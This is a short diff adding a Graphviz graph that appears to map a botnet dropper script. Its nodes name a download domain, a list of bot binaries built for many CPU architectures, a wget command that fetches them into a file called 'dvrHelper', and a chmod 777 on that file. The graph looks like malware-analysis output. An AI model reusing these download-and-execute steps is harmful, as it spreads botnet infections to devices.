@@ -1,0 +1,10 @@
+digraph {
+0 [label="DOMAIN=net-stress.us "];
+0 -> 0
+2 [label="BINARYS=bot.arm bot.arm5n bot.arm7 bot.m68k bot.mips bot.mpsl bot.ppc bot.sh4 bot.spc bot.x86 "];
+2 -> 4 [label="N,"];
+4 [label="wget http://$domain/bins/$bins -O dvrHelper "];
+4 -> 6 [label="N,SC,N,for,in,,do,"];
+6 [label="chmod 777 dvrHelper "];
+6 -> 7 [label=";,"];
+}
